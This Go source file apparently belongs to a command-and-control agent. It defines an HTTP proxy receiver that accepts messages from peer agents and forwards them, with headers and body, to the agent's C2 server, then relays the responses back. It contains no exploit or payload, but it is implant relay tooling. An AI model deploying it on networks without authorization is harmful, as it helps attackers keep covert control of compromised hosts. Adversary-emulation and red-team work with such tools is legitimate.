package proxy

import (
    "bytes"
    "fmt"
    "net/http"
    "io/ioutil"
    "../output"
    "../contact"
)

//HttpReceiver forwards data received from HTTP requests to the upstream server via HTTP. Implements the P2pReceiver interface.
type HttpReceiver struct {
    PortStr string
}

func init() {
	P2pReceiverChannels["http"] = HttpReceiver{ PortStr: "8889" } // default listening port
}

// Start receiving peer-to-peer messages via HTTP. Forward them to this agent's server via HTTP proxy.
// This method will be run as a go routine.
func (receiver HttpReceiver) StartReceiver(profile map[string]interface{}, upstreamComs contact.Contact) {
    // Make sure the agent uses HTTP with the C2.
    switch upstreamComs.(type) {
    case contact.API:
        // p2pReceiverConfig["p2pReceiver"] will contain the port number to listen on.
        output.VerbosePrint(fmt.Sprintf("[*] Starting HTTP proxy receiver on local port %s", receiver.PortStr))
        startHttpProxy(profile, receiver.PortStr)
    default:
        output.VerbosePrint(fmt.Sprintf("[-] Cannot start HTTP proxy receiver if agent is not using HTTP communication with the C2."))
    }
}

// Helper method for StartReceiver. Starts HTTP proxy to forward messages from peers to the C2 server.
func startHttpProxy(profile map[string]interface{}, portStr string) {
    listenPort := ":" + portStr
    server := profile["server"].(string)

    http.HandleFunc("/", func(writer http.ResponseWriter, reader *http.Request) {
        // Get data from message that client peer sent.
		httpClient := http.Client{}
		body, err := ioutil.ReadAll(reader.Body)
		if err != nil {
			http.Error(writer, err.Error(), http.StatusInternalServerError)
			return
		}
		reader.Body = ioutil.NopCloser(bytes.NewReader(body))

		// Determine where to forward the request.
		url := server + reader.RequestURI

        // Forward the request to the C2 server, and send back the response.
		proxyReq, err := http.NewRequest(reader.Method, url, bytes.NewReader(body))
		if err != nil {
			output.VerbosePrint(err.Error())
			return
		}
		proxyReq.Header = make(http.Header)
		for header, val := range reader.Header {
			proxyReq.Header[header] = val
		}
		resp, err := httpClient.Do(proxyReq)
		if err != nil {
			http.Error(writer, err.Error(), http.StatusBadGateway)
			return
		}
		defer resp.Body.Close()
		bites, _ := ioutil.ReadAll(resp.Body)
		writer.Write(bites)
	})
	http.ListenAndServe(listenPort, nil)
}